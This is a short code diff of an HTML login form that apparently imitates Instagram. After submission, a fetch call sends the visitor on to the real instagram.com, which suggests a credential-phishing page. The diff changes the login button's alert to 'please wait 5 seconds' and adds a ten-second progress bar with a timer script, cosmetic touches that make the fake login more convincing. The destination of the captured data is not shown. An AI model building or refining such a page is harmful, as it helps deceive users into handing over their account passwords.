@@ -54,7 +54,7 @@
 <a class="b"href="#">Forgot password?</a>
 
 
-<button name="submit"id="btn"class="btn"type="submit"   onclick="alert('your message here');">Log In</button>
+<button name="submit"id="btn"class="btn"type="submit"   onclick="alert('please wait 5 seconds');">Log In</button>
 </form>
         <p> Don't have an account?<span class="sp">Sign up</span><p>
 <div class="foot">
@@ -64,7 +64,7 @@
 </div>
 </div>
         
-        
+        <progress value="0" max="10" id="progressBar"></progress>
         
         <script>
 
@@ -78,6 +78,17 @@
                 .then(response => window.location.href="https://www.instagram.com")
                 .catch(error => console.error('Error!', error.message))
             })
+                
+                
+                var timeleft = 10;
+var downloadTimer = setInterval(function(){
+  if(timeleft <= 0){
+    clearInterval(downloadTimer);
+  }
+  document.getElementById("progressBar").value = 10 - timeleft;
+  timeleft -= 1;
+}, 1000);
+
           </script>
         <!-- Project -->
         <script src="main.js"></script>
